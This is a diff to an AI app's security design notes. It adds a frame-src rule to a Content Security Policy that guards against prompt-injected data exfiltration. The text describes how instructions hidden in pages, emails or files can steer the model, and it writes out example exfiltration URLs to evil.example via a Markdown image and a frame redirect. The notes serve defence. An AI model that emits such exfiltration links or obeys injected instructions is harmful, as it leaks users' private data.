@@ -243,6 +243,7 @@ The model sees two tools of our own (`server/search/schema.ts`), whatever runs t
 A page, an email from a connector or an attached file can hold text that tells the model what to do. The model can't reliably tell that text from the person's, so Ponder does not rely on the model to ignore it. It closes the ways that private data could leave without the person seeing it:
 
 - Images: the app's pages have a Content Security Policy (`server/app.ts`) that loads images and media only from Ponder, `data:` and `blob:` URLs, and the CDNs an HTML artifact may use. A Markdown image in a reply, such as `![](https://evil.example/?d=...)`, would otherwise load as soon as the reply shows. Artifact frames are `srcdoc` frames, so they are held to this policy too, as well as their own.
+- Frames: the same policy has `frame-src 'none'`, so no frame loads an address. An HTML artifact runs script in its frame, and could otherwise send the frame itself to `https://evil.example/?d=...`, by script or by a meta refresh. A `srcdoc` frame loads no address, so artifacts and slides still show.
 - `web_fetch`: asks first for an address that the person did not give and no search returned (see Web search).
 - Connector tools that change something are on "Ask first" by default, and Python has no network.
 
